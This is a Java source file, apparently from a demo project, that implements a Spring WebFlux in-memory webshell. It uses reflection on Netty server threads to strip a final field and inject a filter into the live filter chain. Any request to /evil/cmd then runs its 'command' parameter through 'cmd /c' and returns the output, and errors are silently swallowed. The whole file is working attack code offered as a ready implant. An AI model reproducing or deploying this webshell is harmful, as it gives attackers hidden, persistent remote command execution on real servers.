package org.example.webfluxmemoryshelldemo.memoryshell;

import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.http.MediaType;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.server.WebHandler;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

@Configuration
public class MemoryShellFilter implements WebFilter{

    public static void doInject() {
        Method getThreads;
        try {
            getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke(null);
            for (int i = 0; i < Array.getLength(threads); i++) {
                Object thread = Array.get(threads, i);
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                    NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
                    ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
                    Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
                    HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
                    ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
                    FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
                    DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
                    Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
                    List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
                    newAllFilters.add(0, new MemoryShellFilter());
                    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
                    Field f = filteringWebHandler.getClass().getDeclaredField("chain");
                    f.setAccessible(true);
                    Field modifersField = Field.class.getDeclaredField("modifiers");
                    modifersField.setAccessible(true);
                    modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                    f.set(filteringWebHandler, newChain);
                    modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
                }
            }
        } catch (Exception ignored) {}
    }

    public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception {
        Field f;
        if(superClass){
            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
        }else {
            f = obj.getClass().getDeclaredField(fieldName);
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    public Flux<DataBuffer> getPost(ServerWebExchange exchange) {
        ServerHttpRequest request = exchange.getRequest();
        String path = request.getURI().getPath();
        String query = request.getURI().getQuery();

        if (path.equals("/evil/cmd") && query != null && query.startsWith("command=")) {
            String command = query.substring(8);
            try {
                Process process = Runtime.getRuntime().exec("cmd /c" + command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                Flux<DataBuffer> response = Flux.create(sink -> {
                    try {
                        String line;
                        while ((line = reader.readLine()) != null) {
                            sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));
                        }
                        sink.complete();
                    } catch (IOException ignored) {}
                });

                exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);
                return response;
            } catch (IOException ignored) {}
        }
        return Flux.empty();
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        if (exchange.getRequest().getURI().getPath().startsWith("/evil/")) {
            doInject();
            Flux<DataBuffer> response = getPost(exchange);
            ServerHttpResponse serverHttpResponse = exchange.getResponse();
            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);
            return serverHttpResponse.writeWith(response);
        } else {
            return chain.filter(exchange);
        }
    }
}